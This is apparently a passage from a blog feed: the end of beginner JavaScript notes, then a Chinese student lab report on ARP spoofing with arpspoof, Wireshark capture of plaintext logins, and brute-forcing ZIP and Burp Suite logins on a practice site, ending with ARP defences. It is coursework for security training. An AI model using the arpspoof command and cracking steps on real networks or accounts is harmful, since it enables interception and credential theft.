class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure><h3 id="数据类型和变量"><a href="#数据类型和变量" class="headerlink" title="数据类型和变量"></a>数据类型和变量</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--</span><br><span class="line"><span class="number">1.</span>js中的变量声明都用<span class="keyword">var</span></span><br><span class="line"><span class="keyword">var</span> a=<span class="number">10</span></span><br><span class="line">    <span class="keyword">var</span> str=<span class="string">&quot;abc&quot;</span></span><br><span class="line"><span class="number">2.</span><span class="variable language_">console</span>.<span class="property">log</span> 输出在控制台</span><br><span class="line"><span class="number">3.</span>prompt 输入</span><br><span class="line"><span class="number">4.</span>数据类型 </span><br><span class="line">数值类型 number 整数 小数</span><br><span class="line">    字符串 string</span><br><span class="line">    布尔类型 boolean</span><br><span class="line">    引用类型 <span class="title class_">Object</span></span><br><span class="line">    函数 <span class="keyword">function</span></span><br><span class="line">变量先赋值后判断类型   </span><br><span class="line">--&gt;</span><br></pre></td></tr></table></figure><h3 id="运算符"><a href="#运算符" class="headerlink" title="运算符"></a>运算符</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--</span><br><span class="line"><span class="number">1.</span>算数 + - * / %</span><br><span class="line"><span class="number">2.</span>复合  ++ -- += -= *= /= %=</span><br><span class="line"><span class="number">3.</span>关系 &gt; &lt; &gt;= &lt;= != == ===</span><br><span class="line">    == 如果两端的数据类型不一致，会尝试两端的数据类型都转换位number再对比</span><br><span class="line">=== 如果两端的数据类型不一致，直接返回<span class="literal">false</span>，相同则会返回<span class="literal">true</span></span><br><span class="line"><span class="number">4.</span>逻辑 $$ ||</span><br><span class="line"><span class="number">5.</span>条件 条件表达式? 值<span class="number">1</span> : 值<span class="number">2</span></span><br><span class="line"><span class="number">6.</span>位 | &amp; ^ &gt;&gt; &lt;&lt; &gt;&gt;&gt;</span><br><span class="line">--&gt;</span><br></pre></td></tr></table></figure><h3 id="分支机构"><a href="#分支机构" class="headerlink" title="分支机构"></a>分支机构</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- <span class="keyword">if</span> <span class="keyword">else</span> ---&gt;</span><br><span class="line"><span class="keyword">if</span>()&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>()&#123;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&lt;!-- <span class="keyword">switch</span> --&gt;</span><br><span class="line"><span class="keyword">switch</span>()&#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">        <span class="attr">dafault</span>:</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="循环结构"><a href="#循环结构" class="headerlink" title="循环结构"></a>循环结构</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- <span class="keyword">while</span> --&gt;</span><br><span class="line"><span class="keyword">while</span>()&#123;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&lt;!-- <span class="keyword">for</span> --&gt;</span><br><span class="line"><span class="keyword">for</span>()&#123;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--</span><br><span class="line"><span class="number">1.</span>函数声明 </span><br><span class="line"><span class="keyword">function</span> 函数名()&#123;&#125;</span><br><span class="line"><span class="keyword">var</span> 函数名=<span class="keyword">function</span>(<span class="params"></span>)&#123;&#125;</span><br><span class="line">--&gt;</span><br></pre></td></tr></table></figure><h3 id="对象"><a href="#对象" class="headerlink" title="对象"></a>对象</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--</span><br><span class="line">对象的创建</span><br><span class="line"><span class="number">1.</span><span class="keyword">new</span> <span class="title class_">Object</span>()</span><br><span class="line"><span class="number">2.</span>&#123;属性名:属性值,... ..., 函数名:<span class="title function_">fuinction</span>(<span class="params"></span>)&#123;&#125;&#125;</span><br><span class="line">--&gt;</span><br><span class="line"><span class="keyword">var</span> person=<span class="keyword">new</span> <span class="title class_">Object</span>()</span><br><span class="line">        <span class="comment">//添加属性</span></span><br><span class="line">        person.<span class="property">name</span>=<span class="string">&#x27;张三&#x27;</span></span><br><span class="line">        person.<span class="property">age</span>=<span class="number">20</span></span><br><span class="line">        <span class="comment">//添加方法</span></span><br><span class="line">        person.<span class="property">eat</span>=<span class="keyword">function</span>(<span class="params">food</span>)&#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(name+<span class="string">&#x27;正在吃&#x27;</span>+food)</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//访问属性</span></span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(person.<span class="property">name</span>)</span><br><span class="line">        <span class="comment">//调用方法</span></span><br><span class="line">        person.<span class="title function_">eat</span>(<span class="string">&#x27;火锅&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> person=&#123;</span><br><span class="line">            <span class="attr">name</span>:<span class="string">&#x27;张三&#x27;</span>,</span><br><span class="line">            <span class="attr">age</span>:<span class="number">20</span>,</span><br><span class="line">            <span class="attr">eat</span>:<span class="keyword">function</span>(<span class="params">food</span>)&#123;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(name+<span class="string">&#x27;正在吃&#x27;</span>+food)</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//访问属性</span></span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(person.<span class="property">name</span>)</span><br><span class="line">        <span class="comment">//调用方法</span></span><br><span class="line">        person.<span class="title function_">eat</span>(<span class="string">&#x27;火锅&#x27;</span>)</span><br></pre></td></tr></table></figure><h3 id="JSON"><a href="#JSON" class="headerlink" title="JSON"></a>JSON</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--</span><br><span class="line"><span class="title class_">JSON</span>格式</span><br><span class="line"><span class="keyword">var</span> personStr=<span class="string">&#x27;&#123;&quot;属性名1&quot;:&quot;属性值2&quot;,&quot;属性名2&quot;:&quot;属性值2&quot;,&quot;属性名&quot;:&#123;&#125;,&quot;属性名&quot;:[]&#125;&#x27;</span></span><br><span class="line">通过<span class="title class_">JSON</span>.<span class="title function_">parse</span>()可以将一个<span class="title class_">JSON</span>串转换为一个对象</span><br><span class="line"><span class="keyword">var</span> person=<span class="title class_">JSON</span>.<span class="title function_">parse</span>(personStr)</span><br><span class="line">通过<span class="title class_">JSON</span>.<span class="title function_">stringify</span>()可以将一个对象转换为<span class="title class_">JSON</span>串</span><br><span class="line"><span class="keyword">var</span> personStr=<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(person)</span><br><span class="line">--&gt;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 开发 </category>
          
          <category> 前端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 前端 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>实验二 网络嗅探与身份认证</title>
      <link href="/2023/12/20/%E5%AE%9E%E9%AA%8C%E4%BA%8C%20%E7%BD%91%E7%BB%9C%E5%97%85%E6%8E%A2%E4%B8%8E%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81/"/>
      <url>/2023/12/20/%E5%AE%9E%E9%AA%8C%E4%BA%8C%20%E7%BD%91%E7%BB%9C%E5%97%85%E6%8E%A2%E4%B8%8E%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81/</url>
      
        <content type="html"><![CDATA[<h1 id="实验二-网络嗅探与身份认证"><a href="#实验二-网络嗅探与身份认证" class="headerlink" title="实验二 网络嗅探与身份认证"></a>实验二 网络嗅探与身份认证</h1><h2 id="实验目的："><a href="#实验目的：" class="headerlink" title="实验目的："></a>实验目的：</h2><p>1、通过使用Wireshark软件掌握Sniffer（嗅探器）工具的使用方法，实现捕捉HTTP等协议的数据包，以理解TCP&#x2F;IP协议中多种协议的数据结构、通过实验了解HTTP等协议明文传输的特性。</p><p>2、研究交换环境下的网络嗅探实现及防范方法，研究并利用ARP协议的安全漏洞，通过Arpspoof实现ARP欺骗以捕获内网其他用户数据。</p><p>3、能利用BrupSuite实现网站登录暴力破解获得登录密码。</p><p>4、能实现ZIP密码破解，理解安全密码的概念和设置。</p><p>系统环境：Kali Linux 2、Windows</p><p>网络环境：交换网络结构</p><p>实验工具：Arpspoof、WireShark、BurpSuite、fcrackzip（用于zip密码破解）。</p><h2 id="实验原理："><a href="#实验原理：" class="headerlink" title="实验原理："></a>实验原理：</h2><p>网络嗅探</p><p>1、网络嗅探概述</p><p>Sniffer（嗅探器）工作在OSI模型的第二层，利用计算机的网卡截获网络数据报文的一种工具，可用来监听网络中的数据，分析网络的流量，以便找出所关心的网络中潜在的问题。例如,假设网络的某一段运行得不是很好,报文的发送比较慢,而我们又不知道问题出在什么地方,此时就可以用嗅探器确定不同网络协议、不同用户的通信流量，相互主机的报文传送间隔时间等，这些信息为管理员判断网络问题、管理网络区域提供了非常宝贵的信息。 </p><p>在正常情况下，一个合法的网络接口应该只响应这样的两种数据帧：帧的目标区域具有和本地网络接口相匹配的硬件地址；帧的目标区域具有“广播地址”。</p><p>如果网卡处于混杂（promiscuous）模式，那么它就可以捕获网络上所有的数据帧，处于对网络的“监听”状态，如果一台机器被配置成这样的方式，它（包括其软件）就是一个嗅探器。</p><p>在交换型以太网中，上述条件2是不满足的。所有的主机连接到SWITCH，SWITCH比HUB更聪明，它知道每台计算机的MAC地址信息和与之相连的特定端口，发给某个主机的数据包会被SWITCH从特定的端口送出，而不是象HUB那样，广播给网络上所有的机器。这种传输形式使交换型以太网的性能大大提高，同时还有一个附加的作用：使传统的嗅探器无法工作。</p><p>交换型网络环境嗅探的核心问题是：如何使本不应到达的数据包到达本地。通常的方法有MAC洪水包和ARP欺骗。其中MAC洪水包是向交换机发送大量含有虚构MAC地址和IP地址的IP包，使交换机无法处理如此多的信息，致使交换机就进入了所谓的”打开失效”模式，也就是开始了类似于集线器的工作方式，向网络上所有的机器广播数据包。</p><p>2、ARP欺骗</p><p>本实验中，我们将要详细分析ARP欺骗模式，并通过ARP欺骗达到交换网络嗅探的目的。</p><p>每一个主机都有一个ARP高速缓存，此缓存中记录了最近一段时间内其它IP地址与其MAC地址的对应关系。如果本机想与某台主机通信，则首先在ARP高速缓存中查找此台主机的IP和MAC信息，如果存在，则直接利用此MAC地址构造以太帧；如果不存在，则向本网络上每一个主机广播一个ARP请求报文，其意义是”如果你有此IP地址，请告诉我你的MAC地址”，目的主机收到此请求包后，发送一个ARP响应报文，本机收到此响应后，把相关信息记录在ARP高速缓存中，以下的步骤同上。</p><p><img src="/../images/%E5%AE%9E%E9%AA%8C%E4%BA%8C%E7%BD%91%E7%BB%9C%E5%97%85%E6%8E%A2%E4%B8%8E%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81.assets/1.png"></p><p>可以看出，ARP协议是有缺点的，第三方主机可以构造一个ARP欺骗报文，而源主机却无法分辨真假。如果发送者硬件地址字段填入攻击者的硬件地址，而发送者IP地址填入被假冒者的IP地址，那么就构造出了一个用于欺骗的ARP请求报文。那么被欺骗主机的ARP高速缓存，被假冒者的IP地址与其MAC地址的对应关系就会更改为欺骗者的，从而达到ARP欺骗的目的。特别的，如果攻击者冒充网关，将转发子网内到外网的所有通信量，以达到捕获其他主机的通信量，从而破坏数据传输的保密性。</p><p>3、密码（口令，Password）安全</p><p>在现实网络中，攻击事件发生的频率越来越高，其中相当多的都是由于网站密码泄露的缘故，或是人为因素导致，或是口令遭到破解，所以从某种角度而言，密码的安全问题不仅仅是技术上的问题，更主要的是人的安全意识问题。</p><p>3.1、口令破解方法</p><p>口令破解主要有两种方法：字典破解和暴力破解。</p><p>字典破解是指通过破解者对管理员的了解，猜测其可能使用某些信息作为密码，例如其姓名、生日、电话号码等，同时结合对密码长度的猜测，利用工具来生成密码破解字典。如果相关信息设置准确，字典破解的成功率很高，并且其速度快，因此字典破解是密码破解的首选。</p><p>而暴力破解是指对密码可能使用的字符和长度进行设定后（例如限定为所有英文字母和所有数字，长度不超过8），对所有可能的密码组合逐个实验。随着可能字符和可能长度的增加，存在的密码组合数量也会变得非常庞大，因此暴力破解往往需要花费很长的时间，尤其是在密码长度大于10，并且包含各种字符（英文字母、数字和标点符号）的情况下。</p><p>3.2、口令破解方式</p><p>口令破解主要有两种方式：离线破解和在线破解。</p><p>离线破解攻击者得到目标主机存放密码的文件后，就可以脱离目标主机，在其他计算机上通过口令破解程序穷举各种可能的口令，如果计算出的新密码与密码文件存放的密码相同，则口令已被破解。</p><p>3.3 候选口令产生器</p><p>候选口令产生器的作用是不断生成可能的口令。有几种方法产生候选口令，一种是用枚举法来构造候选口令（暴力破解），另一种方法是从一个字典文件里读取候选口令（字典破解）。</p><p>3.4 口令加密</p><p>口令加密过程就是用加密算法对从口令候选器送来的候选口令进行加密运算而得到密码。这要求加密算法要采用和目标主机一致的加密算法。加密算法有很多种，通常与操作系统或应用程序的类型和版本相关。</p><p>Burp Suite是一个用于测试Web应用程序安全性的图形工具。该工具使用Java编写，由PortSwigger Security开发。该工具有两个版本。可免费下载的免费版（免费版）和试用期后可购买的完整版（专业版）。免费版本功能显着降低。它的开发旨在为Web应用程序安全检查提供全面的解决方案，Burp Suite是进行Web应用安全测试集成平台。它将各种安全工具无缝地融合在一起，以支持整个测试过程中，从最初的映射和应用程序的攻击面分析，到发现和利用安全漏洞。</p><h2 id="实验步骤和内容："><a href="#实验步骤和内容：" class="headerlink" title="实验步骤和内容："></a>实验步骤和内容：</h2><h3 id="网络嗅探部分："><a href="#网络嗅探部分：" class="headerlink" title="网络嗅探部分："></a>网络嗅探部分：</h3><p>网络嗅探：Wireshark 监听网络流量，抓包。</p><p>ARP欺骗： ArpSpoof，实施ARP欺骗。</p><p>防范： 防范arp欺骗。</p><p><img src="/../images/%E5%AE%9E%E9%AA%8C%E4%BA%8C%E7%BD%91%E7%BB%9C%E5%97%85%E6%8E%A2%E4%B8%8E%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81.assets/2.png"></p><p> 实验网络拓扑</p><h4 id="1、A主机上外网，B运行sinffer-Wireshark-选定只抓源为A的数据-。"><a href="#1、A主机上外网，B运行sinffer-Wireshark-选定只抓源为A的数据-。" class="headerlink" title="1、A主机上外网，B运行sinffer(Wireshark)选定只抓源为A的数据)。"></a>1、A主机上外网，B运行sinffer(Wireshark)选定只抓源为A的数据)。</h4><p>回答：先设置 “echo 1 &gt; &#x2F;proc&#x2F;sys&#x2F;net&#x2F;ipv4&#x2F;ip_forward” 使目标ip正常上网</p><p><img src="/../images/%E5%AE%9E%E9%AA%8C%E4%BA%8C%E7%BD%91%E7%BB%9C%E5%97%85%E6%8E%A2%E4%B8%8E%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81.assets/5.png"></p><p>再使用arp欺骗</p><p><img src="/../images/%E5%AE%9E%E9%AA%8C%E4%BA%8C%E7%BD%91%E7%BB%9C%E5%97%85%E6%8E%A2%E4%B8%8E%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81.assets/3.png"></p><p>使用wirkeshack抓取目标流量包</p><p><img src="/../images/%E5%AE%9E%E9%AA%8C%E4%BA%8C%E7%BD%91%E7%BB%9C%E5%97%85%E6%8E%A2%E4%B8%8E%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81.assets/4.png"></p><h4 id="1-1-写出以上过滤语句。"><a href="#1-1-写出以上过滤语句。" class="headerlink" title="1.1 写出以上过滤语句。"></a>1.1 写出以上过滤语句。</h4><p>回答：ip.src&#x3D;&#x3D;192.168.30.91</p><h4 id="1-2-在互联网上找到任意一个以明文方式传递用户帐号、密码的网站，B是否能看到A和外网（该网站）的通信（A刚输入的帐户和口令）？为什么？"><a href="#1-2-在互联网上找到任意一个以明文方式传递用户帐号、密码的网站，B是否能看到A和外网（该网站）的通信（A刚输入的帐户和口令）？为什么？" class="headerlink" title="1.2 在互联网上找到任意一个以明文方式传递用户帐号、密码的网站，B是否能看到A和外网（该网站）的通信（A刚输入的帐户和口令）？为什么？"></a>1.2 在互联网上找到任意一个以明文方式传递用户帐号、密码的网站，B是否能看到A和外网（该网站）的通信（A刚输入的帐户和口令）？为什么？</h4><p> 回答：不能。因为， B的wireshark不在混杂模式下，所有的主机连接到SWITCH，SWITCH知道每台计算机的MAC地址和与之相连的特定端口，发给某个主机的数据包会被SWITCH从特定的端口送出，所以B不能得到A的外网通信。</p><h4 id="2-1-为了捕获A到外网的数据，B实施ARP欺骗攻击，B将冒充该子网的什么实体？"><a href="#2-1-为了捕获A到外网的数据，B实施ARP欺骗攻击，B将冒充该子网的什么实体？" class="headerlink" title="2.1 为了捕获A到外网的数据，B实施ARP欺骗攻击，B将冒充该子网的什么实体？"></a>2.1 为了捕获A到外网的数据，B实施ARP欺骗攻击，B将冒充该子网的什么实体？</h4><p>回答：B冒充网关</p><h4 id="2-2-写出arpspoof命令格式。"><a href="#2-2-写出arpspoof命令格式。" class="headerlink" title="2.2 写出arpspoof命令格式。"></a>2.2 写出arpspoof命令格式。</h4><p>回答：arpspoof  -i  网卡  -t   目标IP   网关</p><h4 id="2-3-B是否能看到A和外网的通信（A输入的帐户和口令）？截图Wireshark中显示的明文信息。"><a href="#2-3-B是否能看到A和外网的通信（A输入的帐户和口令）？截图Wireshark中显示的明文信息。" class="headerlink" title="2.3 B是否能看到A和外网的通信（A输入的帐户和口令）？截图Wireshark中显示的明文信息。"></a>2.3 B是否能看到A和外网的通信（A输入的帐户和口令）？截图Wireshark中显示的明文信息。</h4><p>回答：（由于实验课结束，A换人，A的IP更改为192.168.30.194）A登陆pikachu，B抓包得到账号&#x2F;密码admin&#x2F;123456</p><p><img src="/../images/%E5%AE%9E%E9%AA%8C%E4%BA%8C%E7%BD%91%E7%BB%9C%E5%97%85%E6%8E%A2%E4%B8%8E%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81.assets/6.png"></p><p><img src="/../images/%E5%AE%9E%E9%AA%8C%E4%BA%8C%E7%BD%91%E7%BB%9C%E5%97%85%E6%8E%A2%E4%B8%8E%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81.assets/7.png"></p><h3 id="FTP数据还原部分："><a href="#FTP数据还原部分：" class="headerlink" title="FTP数据还原部分："></a>FTP数据还原部分：</h3><p>利用WireShark打开实验实验数据data.pcapng。</p><h4 id="3-1-FTP服务器的IP地址是多少？你是如何发现其为FTP服务器的？"><a href="#3-1-FTP服务器的IP地址是多少？你是如何发现其为FTP服务器的？" class="headerlink" title="3.1 FTP服务器的IP地址是多少？你是如何发现其为FTP服务器的？"></a>3.1 FTP服务器的IP地址是多少？你是如何发现其为FTP服务器的？</h4><p>回答：192.168.182.1</p><p>FTP ip地址为192.168.182.1 因为请求方一直是192.168.182.132，回应方一直是192.168.182.132</p><p><img src="/../images/%E5%AE%9E%E9%AA%8C%E4%BA%8C%E7%BD%91%E7%BB%9C%E5%97%85%E6%8E%A2%E4%B8%8E%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81.assets/8.png"></p><h4 id="3-2客户端登录FTP服务器的账号和密码分别是什么"><a href="#3-2客户端登录FTP服务器的账号和密码分别是什么" class="headerlink" title="3.2客户端登录FTP服务器的账号和密码分别是什么?"></a>3.2客户端登录FTP服务器的账号和密码分别是什么?</h4><p>回答：student&#x2F;sN46i5y</p><p><img src="/../images/%E5%AE%9E%E9%AA%8C%E4%BA%8C%E7%BD%91%E7%BB%9C%E5%97%85%E6%8E%A2%E4%B8%8E%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81.assets/9.png"></p><h4 id="3-3-客户端从FTP下载或查看了2个文件，一个为ZIP文件，一个为TXT文件，文件名分别是什么？-提示：文件名有可能是中文。"><a href="#3-3-客户端从FTP下载或查看了2个文件，一个为ZIP文件，一个为TXT文件，文件名分别是什么？-提示：文件名有可能是中文。" class="headerlink" title="3.3 客户端从FTP下载或查看了2个文件，一个为ZIP文件，一个为TXT文件，文件名分别是什么？*提示：文件名有可能是中文。*"></a>3.3 客户端从FTP下载或查看了2个文件，一个为ZIP文件，一个为TXT文件，文件名分别是什么？<em><strong>*提示：文件名有可能是中文。*</strong></em></h4><p>回答：1.zip和复习.Txt</p><p><img src="/../images/%E5%AE%9E%E9%AA%8C%E4%BA%8C%E7%BD%91%E7%BB%9C%E5%97%85%E6%8E%A2%E4%B8%8E%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81.assets/10.png"></p><h4 id="3-4-还原ZIP文件并打开（ZIP有解压密码，试图破解，提示：密码全为数字，并为6位）。截图破解过程。"><a href="#3-4-还原ZIP文件并打开（ZIP有解压密码，试图破解，提示：密码全为数字，并为6位）。截图破解过程。" class="headerlink" title="3.4 还原ZIP文件并打开（ZIP有解压密码，试图破解，提示：密码全为数字，并为6位）。截图破解过程。"></a>3.4 还原ZIP文件并打开（ZIP有解压密码，试图破解，提示：密码全为数字，并为6位）。截图破解过程。</h4><p>回答：将数据流另存为1.zip</p><p><img src="/../images/%E5%AE%9E%E9%AA%8C%E4%BA%8C%E7%BD%91%E7%BB%9C%E5%97%85%E6%8E%A2%E4%B8%8E%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81.assets/11.png"></p><p>再使用Ziperello暴力破解得到密码123456</p><p><img src="/../images/%E5%AE%9E%E9%AA%8C%E4%BA%8C%E7%BD%91%E7%BB%9C%E5%97%85%E6%8E%A2%E4%B8%8E%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81.assets/12.png"></p><p>得到一张企鹅图片</p><p><img src="/../images/%E5%AE%9E%E9%AA%8C%E4%BA%8C%E7%BD%91%E7%BB%9C%E5%97%85%E6%8E%A2%E4%B8%8E%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81.assets/13.png"></p><h4 id="3-5-TXT文件的内容是什么？"><a href="#3-5-TXT文件的内容是什么？" class="headerlink" title="3.5 TXT文件的内容是什么？"></a>3.5 TXT文件的内容是什么？</h4><p><img src="/../images/%E5%AE%9E%E9%AA%8C%E4%BA%8C%E7%BD%91%E7%BB%9C%E5%97%85%E6%8E%A2%E4%B8%8E%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81.assets/14.png"></p><h3 id="4、网站登录密码"><a href="#4、网站登录密码" class="headerlink" title="4、网站登录密码"></a>4、网站登录密码</h3><p>  利用人们平时常用的词、句破译，如果说暴力破解是一个一个的尝试那么字典破译就是利用人们习惯用人名、地名或者常见的词语设置成密码的习惯进行破译。字典破译速度比暴力破译更快但是有时候密码设置中包含了没有字典库中的词句就无法破解出来了，因此有好的字典是关键。</p><p>以pikachu为目标网站，构造字典（wordlist），其中包含你的正确密码，利用burpsuite进行字典攻击，实施字典攻击，你是如何判断某个密码为破解得到的正确密码，截图。</p><p>回答：随便输入账号和密码</p><p><img src="/../images/%E5%AE%9E%E9%AA%8C%E4%BA%8C%E7%BD%91%E7%BB%9C%E5%97%85%E6%8E%A2%E4%B8%8E%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81.assets/15.png"></p><p>通过bp抓包</p><p><img src="/../images/%E5%AE%9E%E9%AA%8C%E4%BA%8C%E7%BD%91%E7%BB%9C%E5%97%85%E6%8E%A2%E4%B8%8E%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81.assets/16.png"></p><p>发送到intruder并添加攻击位置，设置攻击方式为clusterbomb</p><p><img src="/../images/%E5%AE%9E%E9%AA%8C%E4%BA%8C%E7%BD%91%E7%BB%9C%E5%97%85%E6%8E%A2%E4%B8%8E%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81.assets/17.png"></p><p>导入字典并开始攻击</p><p><img src="/../images/%E5%AE%9E%E9%AA%8C%E4%BA%8C%E7%BD%91%E7%BB%9C%E5%97%85%E6%8E%A2%E4%B8%8E%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81.assets/18.png"></p><p>通过字典爆破得admin&#x2F;123456</p><p><img src="/../images/%E5%AE%9E%E9%AA%8C%E4%BA%8C%E7%BD%91%E7%BB%9C%E5%97%85%E6%8E%A2%E4%B8%8E%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81.assets/19.png"></p><h3 id="5、MD5破解"><a href="#5、MD5破解" class="headerlink" title="5、MD5破解"></a>5、MD5破解</h3><p>  SqlMap得到某数据库用户表信息，用户口令的MD5值为7282C5050CFE7DF5E09A33CA456B94AE</p><p>那么，口令的明文是什么？（提示：MD5值破解）</p><p><img src="/../images/%E5%AE%9E%E9%AA%8C%E4%BA%8C%E7%BD%91%E7%BB%9C%E5%97%85%E6%8E%A2%E4%B8%8E%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81.assets/20.png"></p><p>6、John the Ripper的作用是什么？</p><p>回答：John the Ripper是一个密码破解工具，用于测试和评估密码的安全性。它可以通过多种方式破解密码，包括暴力破解、字典攻击和彩虹表攻击等。John the Ripper主要用于渗透测试和密码审计，帮助管理员评估系统中的弱密码并采取相应的安全措施。然而，请注意，使用John the Ripper或其他密码破解工具来未经授权地入侵他人系统是非法的行为。</p><h3 id="思考问题："><a href="#思考问题：" class="headerlink" title="思考问题："></a>思考问题：</h3><h4 id="1、-谈谈如何防止ARP攻击。"><a href="#1、-谈谈如何防止ARP攻击。" class="headerlink" title="1、 谈谈如何防止ARP攻击。"></a>1、 谈谈如何防止ARP攻击。</h4><p><strong>a.使用静态ARP表</strong>： 在网络中使用静态ARP表，将IP地址与MAC地址进行手动绑定。这样可以防止攻击者通过发送虚假的ARP响应来欺骗其他设备。</p><p><strong>b.使用ARP防火墙：</strong> 部署ARP防火墙可以检测和阻止异常的ARP流量。这些防火墙可以监控网络上的ARP请求和响应，识别异常模式，并采取相应的阻止措施。</p><p><strong>c.网络流量监测：</strong>实施网络流量监测工具，监控网络中的ARP请求和响应。异常的ARP流量模式可能表明ARP攻击正在发生。</p><p><strong>c.端口安全特性：</strong> 使用交换机的端口安全特性，限制每个端口上允许的MAC地址数量。这可以防止攻击者通过在网络上发送大量虚假的ARP响应来引发混乱。</p><p><strong>d.启用802.1X认证：</strong> 802.1X认证要求所有连接到网络的设备进行身份验证。只有通过身份验证的设备才能参与网络通信，从而减少了ARP攻击的风险。</p><p><strong>e.使用VPN：</strong> 如果可能，使用虚拟专用网络（VPN）可以加密通信，使得攻击者更难截获和篡改网络通信。</p><p><strong>f.定期审查ARP表：</strong> 管理员可以定期审查网络设备的ARP表，检查是否存在异常的或重复的条目。发现异常情况时，可以采取纠正措施。</p><p><strong>g.网络安全培训：</strong> 